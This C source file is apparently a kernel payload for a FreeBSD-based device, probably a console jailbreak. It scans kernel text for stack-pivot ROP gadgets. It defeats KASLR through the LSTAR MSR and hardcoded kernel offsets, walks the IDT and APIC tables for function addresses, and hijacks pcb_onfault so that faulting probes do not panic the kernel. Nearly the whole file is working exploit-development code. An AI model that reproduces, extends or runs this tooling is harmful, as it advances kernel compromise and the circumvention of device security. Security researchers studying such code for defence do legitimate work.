#include <stdint.h>

/*
 * smart_pivot_scan v5 — Safe ktext pivot gadget scanner with fault recovery
 *
 * KEY INNOVATION: Uses FreeBSD pcb_onfault to CATCH probe faults.
 *
 * When a kernel thread faults without pcb_onfault set, FreeBSD calls
 * trap_fatal() → panic(). By setting pcb_onfault to our recovery label,
 * faults during probes jump to recovery instead of panicking. This is
 * the same mechanism copyin/copyout use.
 *
 * FreeBSD amd64 accesses the current PCB via %gs:PC_CURPCB.
 * pcb_onfault is at offset PCB_ONFAULT within struct pcb.
 * We try common FreeBSD 13 offsets and validate before using.
 *
 * Memory layout:
 *   exec_code page (4096): code + rodata + .bss
 *   kthread_args (4096):   output[0..2303] + safe_region[2304..4095]
 *   kernel stack (16KB):   probe frames pushed here
 *
 * Probing: EPILOGUE — backwards from function boundaries (safe pop/ret).
 *
 * Configure via -D flags:
 *   SCAN_BATCH:  batch index (0-based)
 *   BATCH_SIZE:  function boundaries per batch (default 8)
 *   PROBE_DEPTH: bytes before each boundary (default 16)
 */

#ifndef SCAN_BATCH
#define SCAN_BATCH     0
#endif
#ifndef BATCH_SIZE
#define BATCH_SIZE     8
#endif
#ifndef PROBE_DEPTH
#define PROBE_DEPTH    16
#endif

#define MAGIC_SPVT     0x53505654
#define KTEXT_SIZE     0xC00000
#define HEADER_SLOTS   10

/* Common FreeBSD 13 amd64 offsets for pcb_onfault access.
 * PC_CURPCB: offset of pc_curpcb in struct pcpu (accessed via %gs:)
 * PCB_ONFAULT: offset of pcb_onfault in struct pcb
 *
 * We try multiple candidates and validate by checking the current
 * value is 0 (NULL = no fault handler active, expected for fresh thread).
 */
#define PC_CURPCB_CANDIDATES  3
static const int pc_curpcb_offsets[] = { 0x10, 0x18, 0x20 };
#define PCB_ONFAULT_CANDIDATES 4
static const int pcb_onfault_offsets[] = { 0xb0, 0xb8, 0xc0, 0xc8 };

typedef struct {
    int64_t  kdata_offset;
    int32_t  radius;
} danger_zone_t;

static const danger_zone_t danger_zones[] = {
    { -0x9d20cc, 16 },    { -0x9d0cfa, 64 },
    { -0x396f9e, 16 },    { -0x39700e, 16 },
    { -0x9d6d93, 48 },    { -0x9d6c7a, 48 },
    { -0x9d6b87, 48 },    { -0x9d6f80, 192 },
    { -0x9cf84c, 32 },    { -0x9cf84c + 10, 32 },
    { -0x9cf8ab, 64 },    { -0x96be70, 64 },
    { -0x70b963, 32 },    { 0, 0 }
};

static const int64_t known_ktext_funcs[] = {
    -0x99002a, -0x9908e0, -0x990990, -0x6824c0, -0x8a5c40,
    -0x631ea9, -0x802311, -0xa9b00,  -0x8a54cd, -0x8a52c3,
    -0x8a47d2, -0x8ed940, -0x479d60, -0x9cf990, -0xc1ed0,
    -0x35ebf0, -0x90ac61, -0x2cd31d, -0x1df2ce, -0x85a312,
    -0x6c2989, -0x8a58bc, -0x8a5541, -0x8a5014, -0x8a488c,
    -0x8a5cbe, -0x94a7f0, -0x94ada4, -0x94ad2e, -0x94aaa0,
    -0x21020,  -0x2cc918,
    0
};

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

/* .bss globals for asm (RIP-relative) */
static volatile uint64_t scan_saved_rsp;
static volatile uint64_t scan_resume_pivot;
static volatile int scan_got_pivot;
static volatile int scan_got_fault;
static volatile uint64_t scan_candidate;
static volatile uint64_t safe_addr;
static volatile uint64_t pivot_chain[8];
static volatile uint64_t pcb_onfault_ptr;  /* address of pcb->pcb_onfault */
static uint64_t func_list[96];

__attribute__((naked, used))
static void pivot_landing(void)
{
    __asm__ volatile(
        "movq $1, scan_got_pivot(%%rip)\n\t"
        "movq scan_saved_rsp(%%rip), %%rsp\n\t"
        "jmpq *scan_resume_pivot(%%rip)\n\t"
        ::: "memory"
    );
}

/* Fault recovery: jumped to by trap() via pcb_onfault */
__attribute__((naked, used))
static void fault_recovery(void)
{
    __asm__ volatile(
        "movq $1, scan_got_fault(%%rip)\n\t"
        "movq scan_saved_rsp(%%rip), %%rsp\n\t"
        "jmpq *scan_resume_pivot(%%rip)\n\t"
        ::: "memory"
    );
}

static int is_dangerous(uint64_t addr, uint64_t kdata_base)
{
    for (int i = 0; danger_zones[i].radius != 0; i++) {
        uint64_t center = kdata_base + danger_zones[i].kdata_offset;
        int64_t dist = (int64_t)(addr - center);
        if (dist < 0) dist = -dist;
        if (dist < danger_zones[i].radius)
            return 1;
    }
    return 0;
}

static void sort_u64(uint64_t* arr, int n)
{
    for (int i = 1; i < n; i++) {
        uint64_t key = arr[i];
        int j = i - 1;
        while (j >= 0 && arr[j] > key) {
            arr[j + 1] = arr[j];
            j--;
        }
        arr[j + 1] = key;
    }
}

/*
 * Find pcb_onfault address by probing common FreeBSD 13 offsets.
 * Returns the address of pcb->pcb_onfault, or 0 if not found.
 *
 * Approach:
 *   1. Read %gs:candidate_offset to get pcb pointer
 *   2. Validate: pcb should be a kernel address (0xffffff80...)
 *   3. Read pcb+onfault_offset — should be 0 (no active fault handler)
 *   4. If all checks pass, return &pcb->pcb_onfault
 */
/*
 * Diagnostic version: dump %gs:0x00..0x40 to output for pcpu layout analysis.
 * Does NOT dereference any pointers (safe against faults).
 * Returns 0 always — pcb_onfault discovery deferred until we know offsets.
 */
/*
 * Diagnostic: dump pcpu layout into VISIBLE header slots (out[4..8]).
 * kldload only prints through [0x38] so we use slots the user can see.
 * We also tag out[3] high bits to mark this as a diagnostic dump.
 *
 * Layout:
 *   out[4] = %gs:0x00  (pc_prvspace / self-pointer)
 *   out[5] = %gs:0x08  (pc_curthread)
 *   out[6] = %gs:0x10  (candidate: curpcb or idlethread)
 *   out[7] = %gs:0x18  (candidate: curpcb or fpcurthread)
 *
 * Also dumps %gs:0x00..0xf8 (32 qwords) into out[40..71] in case
 * we can hex-dump the full readback later.
 */
/*
 * v5.2e: Find td_pcb by dumping curthread fields.
 * %gs:0x08 = curthread. We read curthread+offset for a range of offsets
 * looking for td_pcb (kernel stack pointer, 0xffffff80...).
 * Dumps values to out[4..8] for analysis.
 */
static uint64_t find_pcb_onfault(volatile uint64_t* out)
{
    out[3] |= ((uint64_t)0xDDDD << 48);

    /* Get curthread from %gs:0x08 */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0x08, %0" : "=r"(curthread));
    out[4] = curthread;

    /* Scan curthread+0x388..0x408 for td_pcb candidates.
     * td_pcb should be a 0xffffff80... address (kernel stack top).
     * Dump first 4 hits with their offsets. */
    int hits = 0;
    for (int off = 0x380; off <= 0x420 && hits < 3; off += 8) {
        uint64_t val = *(volatile uint64_t*)(curthread + off);
        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
            out[5 + hits] = val;
            out[8] = (out[8] & ~(0xFFFFULL << (hits * 16))) |
                     ((uint64_t)off << (hits * 16));
            hits++;
        }
    }
    if (hits == 0) {
        /* Try wider range: 0x300..0x500 */
        for (int off = 0x300; off <= 0x500 && hits < 3; off += 8) {
            uint64_t val = *(volatile uint64_t*)(curthread + off);
            if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                out[5 + hits] = val;
                out[8] = (out[8] & ~(0xFFFFULL << (hits * 16))) |
                         ((uint64_t)off << (hits * 16));
                hits++;
            }
        }
    }

    return 0;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t ktext_end = ktext_base + KTEXT_SIZE;
    uint64_t nop_ret = kdata_base + (-0x9d20cc) + 2;

    volatile uint64_t* out = (volatile uint64_t*)args;

    for (int i = 0; i < 2304/8; i++)
        out[i] = 0;

    out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_SPVT;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = (uint64_t)SCAN_BATCH | ((uint64_t)BATCH_SIZE << 16) |
             ((uint64_t)PROBE_DEPTH << 32);

    /* Safe region in kthread_args tail */
    volatile uint64_t* safe_region = (volatile uint64_t*)((uint8_t*)args + 2304);
    for (int i = 0; i < (4096 - 2304) / 8; i++)
        safe_region[i] = nop_ret;
    safe_addr = (uint64_t)((uint8_t*)args + 2304 + 896);

    /* Dump curthread fields to find td_pcb */
    pcb_onfault_ptr = find_pcb_onfault(out);
    out[9] = pcb_onfault_ptr;

    /* v5.2e: early return — dump curthread fields only */
    out[0] = ((uint64_t)0xEE02 << 32) | MAGIC_SPVT;
    return 0;

    /* Build sorted function list */
    int n_funcs = 0;

    for (int i = 0; known_ktext_funcs[i] != 0; i++) {
        uint64_t addr = kdata_base + known_ktext_funcs[i];
        if (addr >= ktext_base && addr < ktext_end && n_funcs < 96)
            func_list[n_funcs++] = addr;
    }

    volatile uint8_t* idt = (volatile uint8_t*)(kdata_base + 0x64cdc80);
    for (int i = 0; i < 256 && n_funcs < 96; i++) {
        uint16_t off_lo  = *(volatile uint16_t*)(idt + i*16 + 0);
        uint16_t off_mid = *(volatile uint16_t*)(idt + i*16 + 6);
        uint32_t off_hi  = *(volatile uint32_t*)(idt + i*16 + 8);
        uint64_t handler = (uint64_t)off_lo | ((uint64_t)off_mid << 16) |
                           ((uint64_t)off_hi << 32);
        if (handler >= ktext_base && handler < ktext_end) {
            int dup = 0;
            for (int j = 0; j < n_funcs; j++)
                if (func_list[j] == handler) { dup = 1; break; }
            if (!dup) func_list[n_funcs++] = handler;
        }
    }

    volatile uint64_t* apic_ops = (volatile uint64_t*)(kdata_base + 0x1656b0);
    for (int i = 0; i < 28 && n_funcs < 96; i++) {
        uint64_t fn = apic_ops[i];
        if (fn >= ktext_base && fn < ktext_end) {
            int dup = 0;
            for (int j = 0; j < n_funcs; j++)
                if (func_list[j] == fn) { dup = 1; break; }
            if (!dup) func_list[n_funcs++] = fn;
        }
    }

    sort_u64(func_list, n_funcs);

    /* v5.2d: return after func-list build, before probing.
     * Report how many functions found from each source. */
    out[0] = ((uint64_t)0xEEEE << 32) | MAGIC_SPVT;
    out[4] = n_funcs;  /* total functions found */
    /* Show first 4 function addresses in slots 5-8 */
    for (int i = 0; i < 4 && i < n_funcs; i++)
        out[5 + i] = func_list[i];
    return 0;

    int batch_start = SCAN_BATCH * BATCH_SIZE;
    int batch_end = batch_start + BATCH_SIZE;
    if (batch_start >= n_funcs) {
        out[0] = ((uint64_t)0xFFFF << 32) | MAGIC_SPVT;
        out[4] = n_funcs;
        return 0;
    }
    if (batch_end > n_funcs)
        batch_end = n_funcs;

    pivot_chain[0] = nop_ret;
    pivot_chain[1] = nop_ret;
    pivot_chain[2] = (uint64_t)pivot_landing;
    pivot_chain[3] = nop_ret;
    pivot_chain[4] = nop_ret;
    pivot_chain[5] = nop_ret;
    pivot_chain[6] = nop_ret;
    pivot_chain[7] = nop_ret;

    int total_probed = 0;
    int total_survived = 0;
    int total_faulted = 0;
    int total_skipped = 0;

    for (int fi = batch_start; fi < batch_end; fi++) {
        uint64_t func_entry = func_list[fi];
        int func_idx = fi - batch_start;
        int func_probed = 0;
        int func_survived = 0;
        int func_skipped = 0;
        int func_slot = HEADER_SLOTS + func_idx * 3;

        if (fi + 1 >= n_funcs)
            continue;

        uint64_t next_func = func_list[fi + 1];
        int64_t gap = next_func - func_entry;
        if (gap <= 0 || gap > 0x10000)
            continue;

        int depth = PROBE_DEPTH;
        if (depth > (int)gap)
            depth = (int)gap;

        if (func_slot + 2 < 2304/8) {
            out[func_slot + 0] = next_func;
            out[func_slot + 1] = 0;
            out[func_slot + 2] = 0;
        }

        for (int off = 1; off <= depth; off++) {
            uint64_t candidate = next_func - off;

            if (is_dangerous(candidate, kdata_base)) {
                func_skipped++;
                total_skipped++;
                continue;
            }

            func_probed++;
            total_probed++;
            out[4] = total_probed;
            if (func_slot + 2 < 2304/8)
                out[func_slot + 2] = (uint64_t)off | ((uint64_t)0xBBBB << 32);

            scan_got_pivot = 0;
            scan_got_fault = 0;
            scan_candidate = candidate;

            /*
             * Set pcb_onfault to our fault recovery handler.
             * If the probe faults, trap() will jump to fault_recovery
             * instead of calling trap_fatal() → panic().
             */
            if (pcb_onfault_ptr) {
                *(volatile uint64_t*)pcb_onfault_ptr = (uint64_t)fault_recovery;
            }

            __asm__ volatile(
                "movq %%rsp, scan_saved_rsp(%%rip)\n\t"

                "leaq 2f(%%rip), %%rcx\n\t"
                "movq %%rcx, scan_resume_pivot(%%rip)\n\t"

                /* Push 8 resume addresses + candidate onto real kernel stack */
                "leaq 1f(%%rip), %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"

                "movq scan_candidate(%%rip), %%rcx\n\t"
                "pushq %%rcx\n\t"

                /* Set all registers to safe_addr */
                "movq safe_addr(%%rip), %%rdi\n\t"
                "movq %%rdi, %%rsi\n\t"
                "movq %%rdi, %%rdx\n\t"
                "movq %%rdi, %%rcx\n\t"
                "movq %%rdi, %%rbx\n\t"
                "movq %%rdi, %%rbp\n\t"
                "movq %%rdi, %%r8\n\t"
                "movq %%rdi, %%r9\n\t"
                "movq %%rdi, %%r10\n\t"
                "movq %%rdi, %%r11\n\t"
                "movq %%rdi, %%r12\n\t"
                "movq %%rdi, %%r13\n\t"
                "movq %%rdi, %%r14\n\t"
                "movq %%rdi, %%r15\n\t"

                "cld\n\t"

                "leaq pivot_chain(%%rip), %%rax\n\t"

                "retq\n\t"

                /* Normal/fault resume */
                "1:\n\t"
                "movq scan_saved_rsp(%%rip), %%rsp\n\t"
                "jmp 3f\n\t"

                /* Pivot resume */
                "2:\n\t"
                "movq scan_saved_rsp(%%rip), %%rsp\n\t"

                "3:\n\t"
                ::: "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
                    "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
                    "rbp", "memory", "cc"
            );

            /* Clear pcb_onfault after probe */
            if (pcb_onfault_ptr) {
                *(volatile uint64_t*)pcb_onfault_ptr = 0;
            }

            if (scan_got_pivot) {
                out[7] = candidate;
                out[8] = candidate - ktext_base;
                out[0] = ((uint64_t)0x0002 << 32) | MAGIC_SPVT;
                out[5] = total_survived;
                out[6] = total_skipped | ((uint64_t)total_faulted << 32);
                if (func_slot + 2 < 2304/8) {
                    out[func_slot + 1] = (uint64_t)func_probed |
                                         ((uint64_t)func_survived << 16) |
                                         ((uint64_t)func_skipped << 32);
                    out[func_slot + 2] = (uint64_t)off | ((uint64_t)0x4849 << 32);
                }
                return 0;
            }

            if (scan_got_fault) {
                total_faulted++;
                /* Write faulted count in real-time */
                out[6] = total_skipped | ((uint64_t)total_faulted << 32);
            } else {
                func_survived++;
                total_survived++;
            }
            /* Write survived count in real-time */
            out[5] = total_survived;
        }

        if (func_slot + 2 < 2304/8) {
            out[func_slot + 1] = (uint64_t)func_probed |
                                 ((uint64_t)func_survived << 16) |
                                 ((uint64_t)func_skipped << 32);
            out[func_slot + 2] = (uint64_t)depth |
                                 ((uint64_t)0x0001 << 32);
        }
    }

    out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
    out[4] = total_probed;
    out[5] = total_survived;
    out[6] = total_skipped | ((uint64_t)total_faulted << 32);

    return 0;
}
